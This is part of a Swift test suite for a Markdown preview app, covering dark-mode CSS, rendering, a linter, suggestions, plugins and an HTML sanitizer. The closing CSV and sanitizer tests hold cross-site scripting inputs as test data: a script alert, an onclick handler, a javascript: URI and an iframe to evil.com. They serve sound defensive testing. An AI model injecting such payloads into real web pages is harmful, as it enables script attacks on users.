        let normalizedSelector = rule.selector
            .trimmingCharacters(in: .whitespacesAndNewlines)
        let props = Set(rule.properties.keys.filter { visualProperties.contains($0) })
        if !props.isEmpty {
            darkOverrides[normalizedSelector, default: []].formUnion(props)
        }
    }

    // Selectors that intentionally don't need dark overrides
    let exemptSelectors: Set<String> = [
        "pre code",          // covered by `pre` dark override
        "a:hover",           // inherits from `a` dark override
        ":root",             // color-scheme declaration, not visual
        "img",               // no color properties
        "input[type=\"checkbox\"]", // native control
    ]

    // CSS shorthand → longhand relationships: if dark mode sets any of the longhands,
    // that counts as covering the shorthand's visual aspects
    let shorthandCoverage: [String: [String]] = [
        "border": ["border-color", "border-top-color", "border-right-color", "border-bottom-color", "border-left-color"],
        "border-top": ["border-top-color"],
        "border-right": ["border-right-color"],
        "border-bottom": ["border-bottom-color"],
        "border-left": ["border-left-color"],
    ]

    /// Check if a light selector is covered by a more specific dark selector.
    /// E.g., `code { background }` is covered by `code:not([class*="language-"]) { background }`
    /// combined with `pre { background }` (since code inside pre uses pre's background).
    func selectorCoveredBySpecific(_ lightSel: String, prop: String) -> Bool {
        // `code` is covered for background: code:not(language) handles inline code,
        // and pre handles code blocks (pre code has background: none in light mode)
        if lightSel == "code" && prop == "background" {
            return darkOverrides.keys.contains(where: { $0.hasPrefix("code:not(") })
                && darkOverrides.keys.contains(where: { $0 == "pre" })
        }
        return false
    }

    var missing: [String] = []
    for rule in lightRules {
        let selector = rule.selector.trimmingCharacters(in: .whitespacesAndNewlines)

        // Skip exempt selectors
        if exemptSelectors.contains(selector) { continue }
        if selector.hasPrefix("@") { continue } // skip nested @media (e.g. @media print)

        // Find visual properties in this light rule
        let lightVisualProps = rule.properties.keys.filter { visualProperties.contains($0) }
        if lightVisualProps.isEmpty { continue }

        // Collect all dark-mode properties for this selector (exact + combined group match)
        var foundDarkProps: Set<String> = darkOverrides[selector] ?? []
        for (darkSel, darkProps) in darkOverrides {
            let darkParts = darkSel.components(separatedBy: ",").map { $0.trimmingCharacters(in: .whitespaces) }
            let lightParts = selector.components(separatedBy: ",").map { $0.trimmingCharacters(in: .whitespaces) }
            if lightParts.allSatisfy({ lp in darkParts.contains(lp) }) {
                foundDarkProps.formUnion(darkProps)
            }
        }

        for prop in lightVisualProps {
            if foundDarkProps.contains(prop) { continue }

            // Check shorthand → longhand coverage (e.g., border covered by border-color)
            if let longhands = shorthandCoverage[prop], longhands.contains(where: { foundDarkProps.contains($0) }) {
                continue
            }

            // Check if inheritable property is covered by body
            let inheritableProps: Set<String> = ["color"]
            if inheritableProps.contains(prop) && selector != "body" && darkOverrides["body"]?.contains(prop) == true {
                continue
            }

            // Check if a more specific dark selector covers this
            if selectorCoveredBySpecific(selector, prop: prop) { continue }

            missing.append("\(selector) { \(prop) }")
        }
    }

    if !missing.isEmpty {
        let report = missing.map { "  - \($0)" }.joined(separator: "\n")
        throw TestError.assertionFailed("Dark mode missing overrides for \(missing.count) light-mode visual properties:\n\(report)")
    }
}

runner.test("tables use max-content width not 100%") {
    let full = MarkdownRenderer.wrapInTemplate("<p>test</p>")

    // Tables should fit content (GitHub Primer: width: max-content; max-width: 100%)
    try expect(full.contains("max-content"), "Tables should use width: max-content")
    try expect(full.contains("max-width: 100%"), "Tables should cap at 100% to prevent overflow")
}

// MARK: - Tier 3: Renderer Determinism Tests

print("\n=== Tier 3: Renderer Determinism ===")

runner.test("same input always produces identical output") {
    let md = try loadFixture("basic.md")
    let results = (0..<5).map { _ in MarkdownRenderer.renderHTML(from: md) }
    for i in 1..<results.count {
        try expect(results[i] == results[0], "Non-deterministic output on render \(i)")
    }
}

runner.test("renderer is thread-safe (concurrent renders)") {
    let md = try loadFixture("basic.md")
    let group = DispatchGroup()
    let queue = DispatchQueue(label: "test-concurrent", attributes: .concurrent)
    nonisolated(unsafe) var results = [String?](repeating: nil, count: 10)
    let lock = NSLock()

    for i in 0..<10 {
        group.enter()
        queue.async {
            let html = MarkdownRenderer.renderHTML(from: md)
            lock.lock()
            results[i] = html
            lock.unlock()
            group.leave()
        }
    }
    group.wait()

    let first = results[0]!
    for i in 1..<10 {
        try expect(results[i] == first, "Concurrent render \(i) produced different output")
    }
}

// MARK: - Tier 3: HTML Output Structural Validation

print("\n=== Tier 3: HTML Structural Validation ===")

runner.test("no unclosed tags in rendered HTML") {
    // Check that key block-level tags are balanced in fixture output
    // Uses regex to properly match opening tags (not content inside code blocks)
    for name in fixtureNames {
        let md = try loadFixture("\(name).md")
        let html = MarkdownRenderer.renderHTML(from: md)

        // Only check tags that are unambiguous block-level elements
        // Skip <p> because cmark can produce <p> tags that get split by other elements
        let tagsToCheck = ["h1", "h2", "h3", "h4", "h5", "h6", "blockquote", "table", "ul", "ol"]
        for tag in tagsToCheck {
            // Count opening tags: <tag> or <tag ...>
            var openCount = 0
            var searchRange = html.startIndex..<html.endIndex
            while let range = html.range(of: "<\(tag)[ >]", options: .regularExpression, range: searchRange) {
                openCount += 1
                searchRange = range.upperBound..<html.endIndex
            }
            let closeCount = html.components(separatedBy: "</\(tag)>").count - 1
            if openCount > 0 {
                try expect(openCount == closeCount,
                    "Unbalanced <\(tag)> in \(name).md: \(openCount) open, \(closeCount) close")
            }
        }
    }
}

runner.test("special characters are properly escaped") {
    let md = "Text with <angle> brackets & ampersand"
    let html = MarkdownRenderer.renderHTML(from: md)
    // cmark should escape these in text nodes (CMARK_OPT_UNSAFE allows HTML blocks but text nodes are still escaped)
    try expect(!html.contains("<angle>") || html.contains("&lt;angle&gt;") || html.contains("&amp;"),
               "Special chars not properly escaped")
}

runner.test("all fixtures produce non-empty output") {
    for name in fixtureNames {
        let md = try loadFixture("\(name).md")
        let html = MarkdownRenderer.renderHTML(from: md)
        try expect(!html.isEmpty, "\(name).md produced empty output")
        try expect(html.count > 10, "\(name).md produced suspiciously short output: \(html.count) chars")
    }
}

// MARK: - Tier 3: Performance Regression Gate

print("\n=== Tier 3: Performance Regression Gate ===")

runner.test("all fixtures render under 100ms") {
    for name in fixtureNames {
        let md = try loadFixture("\(name).md")
        let start = CFAbsoluteTimeGetCurrent()
        _ = MarkdownRenderer.renderHTML(from: md)
        let elapsed = (CFAbsoluteTimeGetCurrent() - start) * 1000
        try expect(elapsed < 100, "\(name).md took \(String(format: "%.1f", elapsed))ms (limit: 100ms)")
    }
}

runner.test("full template wrapping under 5ms") {
    let body = "<p>Hello</p>"
    let start = CFAbsoluteTimeGetCurrent()
    for _ in 0..<100 {
        _ = MarkdownRenderer.wrapInTemplate(body)
    }
    let avgMs = (CFAbsoluteTimeGetCurrent() - start) * 1000 / 100
    try expect(avgMs < 5, "Template wrapping: \(String(format: "%.2f", avgMs))ms avg (limit: 5ms)")
}

runner.test("debounce-simulated rapid renders stay under budget") {
    // Simulate 20 rapid re-renders (as if user is typing fast)
    let md = try loadFixture("basic.md")
    let start = CFAbsoluteTimeGetCurrent()
    for _ in 0..<20 {
        _ = MarkdownRenderer.renderHTML(from: md)
    }
    let totalMs = (CFAbsoluteTimeGetCurrent() - start) * 1000
    let avgMs = totalMs / 20
    print("    20 rapid renders: \(String(format: "%.1f", totalMs))ms total, \(String(format: "%.2f", avgMs))ms avg")
    try expect(avgMs < 50, "Rapid render avg \(String(format: "%.1f", avgMs))ms exceeds 50ms budget")
}

// MARK: - Settings Enum Tests
//
// These enums mirror the definitions in Sources/MarkView/Settings.swift.
// The test runner can't import MarkView (SwiftUI dependency), so we redefine
// the enum contracts here to verify raw values, labels, and CSS values are correct.

print("\n=== Settings Enum Tests ===")

enum TestAppTheme: String, CaseIterable {
    case light, dark, system
    var label: String {
        switch self {
        case .light: return "Light"
        case .dark: return "Dark"
        case .system: return "System"
        }
    }
}

enum TestPreviewWidth: String, CaseIterable {
    case narrow, medium, wide, full
    var label: String {
        switch self {
        case .narrow: return "Narrow (700px)"
        case .medium: return "Medium (900px)"
        case .wide: return "Wide (1200px)"
        case .full: return "Full Width"
        }
    }
    var cssValue: String {
        switch self {
        case .narrow: return "700px"
        case .medium: return "900px"
        case .wide: return "1200px"
        case .full: return "100%"
        }
    }
}

enum TestTabBehavior: String, CaseIterable {
    case twoSpaces, fourSpaces, tab
    var label: String {
        switch self {
        case .twoSpaces: return "2 Spaces"
        case .fourSpaces: return "4 Spaces"
        case .tab: return "Tab"
        }
    }
    var insertionString: String {
        switch self {
        case .twoSpaces: return "  "
        case .fourSpaces: return "    "
        case .tab: return "\t"
        }
    }
}

runner.test("AppTheme has 3 cases and is CaseIterable") {
    let cases = ["light", "dark", "system"]
    for raw in cases {
        let theme = TestAppTheme(rawValue: raw)
        try expect(theme != nil, "AppTheme missing case: \(raw)")
    }
    try expect(TestAppTheme.allCases.count == 3, "Expected 3 AppTheme cases, got \(TestAppTheme.allCases.count)")
}

runner.test("AppTheme default is system") {
    try expect(TestAppTheme.system.rawValue == "system", "Default theme should be 'system'")
}

runner.test("PreviewWidth has 4 cases and correct CSS values") {
    try expect(TestPreviewWidth.allCases.count == 4, "Expected 4 PreviewWidth cases")
    try expect(TestPreviewWidth.narrow.cssValue == "700px", "Narrow should be 700px")
    try expect(TestPreviewWidth.medium.cssValue == "900px", "Medium should be 900px")
    try expect(TestPreviewWidth.wide.cssValue == "1200px", "Wide should be 1200px")
    try expect(TestPreviewWidth.full.cssValue == "100%", "Full should be 100%")
}

runner.test("PreviewWidth default is medium") {
    try expect(TestPreviewWidth.medium.rawValue == "medium", "Default width should be 'medium'")
}

runner.test("TabBehavior has 3 cases and correct insertion strings") {
    try expect(TestTabBehavior.allCases.count == 3, "Expected 3 TabBehavior cases")
    try expect(TestTabBehavior.twoSpaces.insertionString == "  ", "2 spaces should insert 2 spaces")
    try expect(TestTabBehavior.fourSpaces.insertionString == "    ", "4 spaces should insert 4 spaces")
    try expect(TestTabBehavior.tab.insertionString == "\t", "Tab should insert tab character")
}

runner.test("TabBehavior default is fourSpaces") {
    try expect(TestTabBehavior.fourSpaces.rawValue == "fourSpaces", "Default tab behavior should be 'fourSpaces'")
}

runner.test("AppTheme labels are correct") {
    try expect(TestAppTheme.light.label == "Light", "Light theme label")
    try expect(TestAppTheme.dark.label == "Dark", "Dark theme label")
    try expect(TestAppTheme.system.label == "System", "System theme label")
}

runner.test("PreviewWidth labels are correct") {
    try expect(TestPreviewWidth.narrow.label == "Narrow (700px)", "Narrow label")
    try expect(TestPreviewWidth.medium.label == "Medium (900px)", "Medium label")
    try expect(TestPreviewWidth.wide.label == "Wide (1200px)", "Wide label")
    try expect(TestPreviewWidth.full.label == "Full Width", "Full label")
}

runner.test("TabBehavior labels are correct") {
    try expect(TestTabBehavior.twoSpaces.label == "2 Spaces", "2 spaces label")
    try expect(TestTabBehavior.fourSpaces.label == "4 Spaces", "4 spaces label")
    try expect(TestTabBehavior.tab.label == "Tab", "Tab label")
}

runner.test("AppTheme raw values round-trip") {
    for theme in TestAppTheme.allCases {
        let recovered = TestAppTheme(rawValue: theme.rawValue)
        try expect(recovered == theme, "Round-trip failed for \(theme)")
    }
}

runner.test("PreviewWidth raw values round-trip") {
    for width in TestPreviewWidth.allCases {
        let recovered = TestPreviewWidth(rawValue: width.rawValue)
        try expect(recovered == width, "Round-trip failed for \(width)")
    }
}

runner.test("TabBehavior raw values round-trip") {
    for tab in TestTabBehavior.allCases {
        let recovered = TestTabBehavior(rawValue: tab.rawValue)
        try expect(recovered == tab, "Round-trip failed for \(tab)")
    }
}

runner.test("Invalid raw values return nil") {
    try expect(TestAppTheme(rawValue: "invalid") == nil, "Invalid AppTheme should be nil")
    try expect(TestPreviewWidth(rawValue: "invalid") == nil, "Invalid PreviewWidth should be nil")
    try expect(TestTabBehavior(rawValue: "invalid") == nil, "Invalid TabBehavior should be nil")
}

// MARK: - Linter Tests

print("\n=== Linter Tests ===")

let linter = MarkdownLinter()

func loadLintFixture(_ name: String) throws -> String {
    guard let url = Bundle.module.url(forResource: name, withExtension: "md", subdirectory: "Fixtures/lint") else {
        throw TestError.fixtureNotFound("lint/\(name).md")
    }
    return try String(contentsOf: url, encoding: .utf8)
}

// Rule detection tests (positive)

runner.test("linter detects inconsistent headings") {
    let md = try loadLintFixture("inconsistent-headings")
    let diags = linter.lint(md, rules: [.inconsistentHeadings])
    try expect(diags.count >= 1, "Expected at least 1 diagnostic, got \(diags.count)")
    try expect(diags[0].rule == .inconsistentHeadings, "Wrong rule: \(diags[0].rule)")
}

runner.test("linter detects trailing whitespace") {
    let md = "# Title\nHello   \nWorld\n"
    let diags = linter.lint(md, rules: [.trailingWhitespace])
    try expect(diags.count >= 1, "Expected at least 1 trailing whitespace diagnostic, got \(diags.count)")
    try expect(diags[0].rule == .trailingWhitespace, "Wrong rule")
}

runner.test("linter detects missing blank lines") {
    let md = try loadLintFixture("missing-blank-lines")
    let diags = linter.lint(md, rules: [.missingBlankLines])
    try expect(diags.count >= 1, "Expected at least 1 diagnostic, got \(diags.count)")
    try expect(diags[0].rule == .missingBlankLines, "Wrong rule")
}

runner.test("linter detects duplicate headings") {
    let md = try loadLintFixture("duplicate-headings")
    let diags = linter.lint(md, rules: [.duplicateHeadings])
    try expect(diags.count >= 1, "Expected at least 1 diagnostic, got \(diags.count)")
    try expect(diags[0].rule == .duplicateHeadings, "Wrong rule")
}

runner.test("linter detects broken links") {
    let md = try loadLintFixture("broken-links")
    let diags = linter.lint(md, rules: [.brokenLinks])
    try expect(diags.count == 1, "Expected 1 broken link, got \(diags.count)")
    try expect(diags[0].message.contains("missing-ref"), "Should reference 'missing-ref'")
}

runner.test("linter detects unclosed fences") {
    let md = try loadLintFixture("unclosed-fences")
    let diags = linter.lint(md, rules: [.unclosedFences])
    try expect(diags.count == 1, "Expected 1 unclosed fence, got \(diags.count)")
    try expect(diags[0].severity == .error, "Unclosed fence should be error")
}

runner.test("linter detects unclosed formatting") {
    let md = try loadLintFixture("unclosed-formatting")
    let diags = linter.lint(md, rules: [.unclosedFormatting])
    try expect(diags.count >= 2, "Expected at least 2 diagnostics (bold + strikethrough), got \(diags.count)")
}

runner.test("linter detects mismatched brackets") {
    let md = try loadLintFixture("mismatched-brackets")
    let diags = linter.lint(md, rules: [.mismatchedBrackets])
    try expect(diags.count >= 1, "Expected at least 1 mismatched bracket, got \(diags.count)")
    try expect(diags[0].severity == .error, "Mismatched bracket should be error")
}

runner.test("linter detects invalid tables") {
    let md = try loadLintFixture("invalid-tables")
    let diags = linter.lint(md, rules: [.invalidTables])
    try expect(diags.count >= 1, "Expected at least 1 invalid table row, got \(diags.count)")
}

// Negative tests (clean file)

runner.test("linter produces no diagnostics for clean file") {
    let md = try loadLintFixture("clean")
    let diags = linter.lint(md)
    try expect(diags.isEmpty, "Clean file should have no diagnostics, got \(diags.count): \(diags.map { "\($0.rule.rawValue) L\($0.line)" })")
}

runner.test("linter clean: no inconsistent headings in proper hierarchy") {
    let md = "# H1\n\n## H2\n\n### H3\n"
    let diags = linter.lint(md, rules: [.inconsistentHeadings])
    try expect(diags.isEmpty, "Proper heading hierarchy should produce no diagnostics")
}

runner.test("linter clean: no trailing whitespace") {
    let md = "# Title\n\nNo trailing spaces here.\n"
    let diags = linter.lint(md, rules: [.trailingWhitespace])
    try expect(diags.isEmpty, "No trailing whitespace should produce no diagnostics")
}

runner.test("linter allows 2-space line break") {
    let md = "Line with break  \nNext line\n"
    let diags = linter.lint(md, rules: [.trailingWhitespace])
    try expect(diags.isEmpty, "2-space line break should not be flagged")
}

runner.test("linter clean: no broken links when refs defined") {
    let md = "Click [here][ref] for info.\n\n[ref]: https://example.com\n"
    let diags = linter.lint(md, rules: [.brokenLinks])
    try expect(diags.isEmpty, "Valid reference links should produce no diagnostics")
}

runner.test("linter clean: closed code fences") {
    let md = "```swift\nlet x = 1\n```\n"
    let diags = linter.lint(md, rules: [.unclosedFences])
    try expect(diags.isEmpty, "Closed fences should produce no diagnostics")
}

runner.test("linter clean: balanced formatting") {
    let md = "This is **bold** and ~~struck~~.\n"
    let diags = linter.lint(md, rules: [.unclosedFormatting])
    try expect(diags.isEmpty, "Balanced formatting should produce no diagnostics")
}

runner.test("linter clean: valid links") {
    let md = "A [valid link](https://example.com) works.\n"
    let diags = linter.lint(md, rules: [.mismatchedBrackets])
    try expect(diags.isEmpty, "Valid links should produce no diagnostics")
}

runner.test("linter clean: consistent table columns") {
    let md = "| A | B |\n|---|---|\n| 1 | 2 |\n"
    let diags = linter.lint(md, rules: [.invalidTables])
    try expect(diags.isEmpty, "Consistent tables should produce no diagnostics")
}

// Integration tests

runner.test("linter has 9 rules") {
    try expect(LintRule.allCases.count == 9, "Expected 9 lint rules, got \(LintRule.allCases.count)")
}

runner.test("linter diagnostics are sorted by line") {
    let md = "Some text\n# Heading\n**unclosed\n"
    let diags = linter.lint(md)
    for i in 1..<diags.count {
        try expect(diags[i].line >= diags[i-1].line, "Diagnostics should be sorted by line")
    }
}

runner.test("linter with empty input") {
    let diags = linter.lint("")
    try expect(diags.isEmpty, "Empty input should produce no diagnostics")
}

// MARK: - Linter Auto-Fix Tests

print("\n=== Linter Auto-Fix Tests ===")

runner.test("autoFix removes trailing whitespace") {
    let md = "# Title\nHello   \nWorld\n"
    let fixed = linter.autoFix(md)
    try expect(!fixed.contains("Hello   "), "Trailing whitespace should be removed")
    try expect(fixed.contains("Hello\n"), "Content should be preserved without trailing spaces")
}

runner.test("autoFix preserves 2-space line breaks") {
    let md = "Line with break  \nNext line\n"
    let fixed = linter.autoFix(md)
    try expect(fixed.contains("break  \n"), "2-space line break must be preserved")
}

runner.test("autoFix adds blank lines before headings") {
    let md = "Some text\n## Heading\n"
    let fixed = linter.autoFix(md)
    let lines = fixed.components(separatedBy: "\n")
    // Find the heading line index
    if let headingIdx = lines.firstIndex(where: { $0.hasPrefix("## ") }) {
        try expect(headingIdx > 0, "Heading should not be first line after fix")
        let prevLine = lines[headingIdx - 1]
        try expect(prevLine.trimmingCharacters(in: .whitespaces).isEmpty,
            "Blank line should be inserted before heading")
    } else {
        throw TestError.assertionFailed("Heading not found in fixed output")
    }
}

runner.test("autoFix is idempotent") {
    let md = "# Title\n\nSome text   \nMore text\n## Sub\n"
    let fixed1 = linter.autoFix(md)
    let fixed2 = linter.autoFix(fixed1)
    try expect(fixed1 == fixed2, "Applying autoFix twice should produce same result")
}

runner.test("autoFix reduces lint warnings") {
    let md = "# Title\nSome text   \nMore text\n## Sub\n"
    let before = linter.lint(md)
    let fixed = linter.autoFix(md)
    let after = linter.lint(fixed)
    let beforeFixable = before.filter { MarkdownLinter.autoFixableRules.contains($0.rule) }.count
    let afterFixable = after.filter { MarkdownLinter.autoFixableRules.contains($0.rule) }.count
    try expect(afterFixable < beforeFixable,
        "Auto-fix should reduce fixable warnings (before: \(beforeFixable), after: \(afterFixable))")
}

runner.test("autoFix does not modify clean input") {
    let md = "# Title\n\nClean paragraph.\n\n## Sub\n\nAnother paragraph.\n"
    let fixed = linter.autoFix(md)
    try expect(fixed == md, "Clean input should not be modified by autoFix")
}

runner.test("autoFix handles empty input") {
    let fixed = linter.autoFix("")
    try expect(fixed == "", "Empty input should remain empty")
}

runner.test("autoFix handles content inside code fences") {
    let md = "```\nsome text   \nmore   \n```\n"
    let fixed = linter.autoFix(md)
    // Code fence content should still get trailing whitespace fixed
    // (the linter checks trailing whitespace globally, not just outside fences)
    try expect(fixed.contains("```"), "Code fences should be preserved")
}

runner.test("autoFixableRules contains expected rules") {
    try expect(MarkdownLinter.autoFixableRules.contains(.trailingWhitespace),
        "trailingWhitespace should be auto-fixable")
    try expect(MarkdownLinter.autoFixableRules.contains(.missingBlankLines),
        "missingBlankLines should be auto-fixable")
    try expect(!MarkdownLinter.autoFixableRules.contains(.brokenLinks),
        "brokenLinks should NOT be auto-fixable")
    try expect(!MarkdownLinter.autoFixableRules.contains(.unclosedFences),
        "unclosedFences should NOT be auto-fixable")
}

// MARK: - Lint Popover UI Tests

print("\n--- Lint Popover UI Tests ---")

let statusBarSource = (try? String(contentsOfFile: "Sources/MarkView/StatusBarView.swift", encoding: .utf8)) ?? ""
let viewModelSource = (try? String(contentsOfFile: "Sources/MarkView/PreviewViewModel.swift", encoding: .utf8)) ?? ""
let contentViewSource = (try? String(contentsOfFile: "Sources/MarkView/ContentView.swift", encoding: .utf8)) ?? ""

runner.test("StatusBarView has clickable lint button") {
    try expect(statusBarSource.contains("Button") && statusBarSource.contains("showLintPopover"),
        "StatusBarView must wrap lint icons in a Button that toggles popover")
}

runner.test("StatusBarView shows popover on click") {
    try expect(statusBarSource.contains(".popover(isPresented:"),
        "StatusBarView must use .popover modifier for lint diagnostic display")
}

runner.test("StatusBarView accepts lintDiagnostics parameter") {
    try expect(statusBarSource.contains("lintDiagnostics: [LintDiagnostic]"),
        "StatusBarView must accept full diagnostic array, not just counts")
}

runner.test("StatusBarView has Fix All button") {
    try expect(statusBarSource.contains("onFixAll") && statusBarSource.contains("lintFixAll"),
        "StatusBarView must have a Fix All button with callback")
}

runner.test("LintPopoverView shows diagnostic details") {
    try expect(statusBarSource.contains("diagnostic.message") && statusBarSource.contains("diagnostic.rule"),
        "Popover must show diagnostic message and rule")
}

runner.test("LintPopoverView shows line and column") {
    try expect(statusBarSource.contains("diagnostic.line") && statusBarSource.contains("diagnostic.column"),
        "Popover must show line and column location")
}

runner.test("LintPopoverView shows fix suggestions") {
    try expect(statusBarSource.contains("diagnostic.fix"),
        "Popover must show fix suggestions when available")
}

runner.test("LintDiagnosticRow has severity icon") {
    try expect(statusBarSource.contains("xmark.circle.fill") && statusBarSource.contains("exclamationmark.triangle.fill"),
        "Diagnostic row must show severity-appropriate icon")
}

runner.test("LintPopoverView has accessibility labels") {
    try expect(statusBarSource.contains("lintPopoverA11yLabel") && statusBarSource.contains("lintDiagnosticA11y"),
        "Popover must have accessibility labels")
}

runner.test("PreviewViewModel stores full diagnostics array") {
    try expect(viewModelSource.contains("@Published var lintDiagnostics: [LintDiagnostic]"),
        "ViewModel must publish full LintDiagnostic array")
}

runner.test("PreviewViewModel has autoFixLint method") {
    try expect(viewModelSource.contains("func autoFixLint()") && viewModelSource.contains("linter.autoFix"),
        "ViewModel must have autoFixLint method that calls linter.autoFix")
}

runner.test("ContentView passes diagnostics and fix callback to StatusBarView") {
    try expect(contentViewSource.contains("lintDiagnostics: viewModel.lintDiagnostics"),
        "ContentView must pass diagnostics to StatusBarView")
    try expect(contentViewSource.contains("onFixAll:") && contentViewSource.contains("autoFixLint"),
        "ContentView must pass autoFixLint callback to StatusBarView")
}

// MARK: - Auto-Suggest Tests

print("\n=== Auto-Suggest Tests ===")

let suggestions = MarkdownSuggestions()

runner.test("supported languages list has 18 entries") {
    try expect(MarkdownSuggestions.supportedLanguages.count == 18,
        "Expected 18 languages, got \(MarkdownSuggestions.supportedLanguages.count)")
}

runner.test("language suggestions filter by prefix") {
    let swiftResults = suggestions.suggestLanguages(prefix: "sw")
    try expect(swiftResults.count == 1, "Expected 1 match for 'sw', got \(swiftResults.count)")
    try expect(swiftResults[0].text == "swift", "Expected 'swift'")

    let jResults = suggestions.suggestLanguages(prefix: "j")
    try expect(jResults.count == 3, "Expected 3 matches for 'j' (java, javascript, json), got \(jResults.count)")
}

runner.test("language suggestions return all when empty prefix") {
    let all = suggestions.suggestLanguages()
    try expect(all.count == 18, "Expected all 18 languages, got \(all.count)")
}

runner.test("emoji lookup works") {
    try expect(suggestions.lookupEmoji(":rocket:") == "\u{1F680}", "rocket emoji")
    try expect(suggestions.lookupEmoji("star") == "\u{2B50}", "star emoji without colons")
    try expect(suggestions.lookupEmoji(":nonexistent:") == nil, "nonexistent emoji")
}

runner.test("emoji suggestions filter by prefix") {
    let results = suggestions.suggestEmoji(prefix: "th")
    try expect(results.count >= 2, "Expected at least 2 matches for 'th' (thinking, thumbsup, thumbsdown)")
    try expect(results.allSatisfy({ $0.kind == .emoji }), "All should be emoji kind")
}

runner.test("heading suggestions reflect document structure") {
    let doc = "# Title\n\n## Section\n\nSome text\n\n### Subsection\n"
    let results = suggestions.suggestHeadings(document: doc)
    try expect(results.count == 3, "Expected 3 heading levels, got \(results.count)")
    try expect(results[0].text == "# ", "First should be h1")
    try expect(results[1].text == "## ", "Second should be h2")
    try expect(results[2].text == "### ", "Third should be h3")
}

runner.test("heading suggestions with no headings returns empty") {
    let doc = "Just some plain text.\n"
    let results = suggestions.suggestHeadings(document: doc)
    try expect(results.isEmpty, "No headings should give empty suggestions")
}

runner.test("link suggestions reflect document references") {
    let doc = "Click [here][ref1] for info.\n\n[ref1]: https://example.com\n[docs]: https://docs.example.com/guide\n"
    let results = suggestions.suggestLinks(document: doc)
    try expect(results.count == 2, "Expected 2 reference links, got \(results.count)")
    let labels = results.map { $0.text }
    try expect(labels.contains("[ref1]"), "Should contain ref1")
    try expect(labels.contains("[docs]"), "Should contain docs")
}

runner.test("link suggestions with no refs returns empty") {
    let doc = "Just [inline](https://example.com) links.\n"
    let results = suggestions.suggestLinks(document: doc)
    try expect(results.isEmpty, "No reference definitions should give empty suggestions")
}

runner.test("suggestion kinds are correct") {
    let langSugg = suggestions.suggestLanguages(prefix: "swift")
    try expect(langSugg.first?.kind == .language, "Language suggestion kind")

    let emojiSugg = suggestions.suggestEmoji(prefix: "rock")
    try expect(emojiSugg.first?.kind == .emoji, "Emoji suggestion kind")

    let headSugg = suggestions.suggestHeadings(document: "# Title\n")
    try expect(headSugg.first?.kind == .heading, "Heading suggestion kind")

    let linkSugg = suggestions.suggestLinks(document: "[ref]: https://x.com\n")
    try expect(linkSugg.first?.kind == .link, "Link suggestion kind")
}

// MARK: - Plugin & Sanitizer Tests

print("\n=== Plugin & Sanitizer Tests ===")

let registry = PluginRegistry()
let sanitizer = HTMLSanitizer()

func loadPluginFixture(_ path: String) throws -> String {
    guard let url = Bundle.module.url(forResource: path, withExtension: nil, subdirectory: "Fixtures") else {
        throw TestError.fixtureNotFound(path)
    }
    return try String(contentsOf: url, encoding: .utf8)
}

// Plugin registry tests

runner.test("plugin registry: register and lookup") {
    let reg = PluginRegistry()
    let mdPlugin = MarkdownPlugin()
    reg.register(mdPlugin)
    try expect(reg.plugin(forExtension: "md") != nil, "Should find plugin for .md")
    try expect(reg.plugin(forExtension: "markdown") != nil, "Should find plugin for .markdown")
    try expect(reg.plugin(forExtension: "xyz") == nil, "Should not find plugin for .xyz")
}

runner.test("plugin registry: registered extensions") {
    let reg = PluginRegistry()
    reg.register(MarkdownPlugin())
    reg.register(CSVPlugin())
    let exts = reg.registeredExtensions
    try expect(exts.contains("md"), "Should contain md")
    try expect(exts.contains("csv"), "Should contain csv")
    try expect(exts.contains("tsv"), "Should contain tsv")
}

runner.test("plugin registry: clear") {
    let reg = PluginRegistry()
    reg.register(MarkdownPlugin())
    reg.clear()
    try expect(reg.plugin(forExtension: "md") == nil, "Should be empty after clear")
}

runner.test("plugin registry: case insensitive lookup") {
    let reg = PluginRegistry()
    reg.register(HTMLPlugin())
    try expect(reg.plugin(forExtension: "HTML") != nil, "Should find plugin for .HTML")
    try expect(reg.plugin(forExtension: "Html") != nil, "Should find plugin for .Html")
}

// Markdown plugin tests

runner.test("markdown plugin renders correctly") {
    let plugin = MarkdownPlugin()
    let html = plugin.render(source: "# Hello\n\n**Bold** text")
    try expect(hasTag("h1", in: html, containing: "Hello"), "Should contain heading")
    try expect(html.contains("<strong>Bold</strong>"), "Should contain bold")
}

runner.test("markdown plugin does not require JS") {
    let plugin = MarkdownPlugin()
    try expect(!plugin.requiresJSExecution, "Markdown should not require JS")
}

// CSV plugin tests

runner.test("CSV plugin renders simple table") {
    let csv = try loadPluginFixture("csv/simple.csv")
    let plugin = CSVPlugin()
    let html = plugin.render(source: csv)
    try expect(html.contains("<table>"), "Should contain table")
    try expect(html.contains("<th>Name</th>"), "Should contain header")
    try expect(html.contains("<td>Alice</td>"), "Should contain data cell")
    try expect(html.contains("<thead>"), "Should contain thead")
    try expect(html.contains("<tbody>"), "Should contain tbody")
}

runner.test("CSV plugin renders unicode") {
    let csv = try loadPluginFixture("csv/unicode.csv")
    let plugin = CSVPlugin()
    let html = plugin.render(source: csv)
    try expect(html.contains("<table>"), "Should contain table")
    try expect(html.contains("Bonjour"), "Should contain unicode text")
}

runner.test("CSV plugin escapes HTML in cells") {
    let plugin = CSVPlugin()
    let html = plugin.render(source: "Header\n<script>alert('xss')</script>")
    try expect(!html.contains("<script>"), "Should escape script tags in cells")
    try expect(html.contains("&lt;script&gt;"), "Should HTML-escape the content")
}

runner.test("CSV plugin handles empty input") {
    let plugin = CSVPlugin()
    let html = plugin.render(source: "")
    try expect(html.contains("Empty"), "Should indicate empty file")
}

// HTML sanitizer tests

runner.test("sanitizer strips script tags") {
    let html = "<p>Hello</p><script>alert('xss')</script><p>World</p>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<script"), "Should strip script tags")
    try expect(!clean.contains("alert"), "Should strip script content")
    try expect(clean.contains("<p>Hello</p>"), "Should preserve safe content")
    try expect(clean.contains("<p>World</p>"), "Should preserve safe content")
}

runner.test("sanitizer strips event handlers") {
    let html = "<div onclick=\"alert('click')\">Click</div>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("onclick"), "Should strip onclick")
    try expect(clean.contains("Click"), "Should preserve div text")
}

runner.test("sanitizer blocks javascript URIs") {
    let html = "<a href=\"javascript:alert('xss')\">Link</a>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("javascript:"), "Should block javascript: URI")
    try expect(clean.contains("blocked:"), "Should replace with blocked:")
}

runner.test("sanitizer strips iframes") {
    let html = "<p>Text</p><iframe src=\"https://evil.com\"></iframe><p>More</p>"
    let clean = sanitizer.sanitize(html)
    try expect(!clean.contains("<iframe"), "Should strip iframe tags")
    try expect(clean.contains("<p>Text</p>"), "Should preserve safe content")
}

